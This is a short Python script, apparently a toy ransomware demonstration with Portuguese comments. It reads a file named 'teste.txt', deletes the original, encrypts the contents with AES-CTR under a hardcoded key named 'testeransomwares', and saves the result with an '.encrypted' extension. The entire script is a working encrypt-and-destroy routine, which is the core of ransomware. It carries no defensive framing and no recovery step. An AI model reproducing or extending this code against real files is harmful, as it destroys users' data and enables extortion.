import os
import pyaes

## O arquivo que será criptografado
file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()

## Excluir o arquivo original
os.remove(file_name)

## Definir a chave de encrypt
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografando o arquivo
crypto_data = aes.encrypt(file_data)

## Criando o arquivo criptografado
new_file = file_name + '.encrypted'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
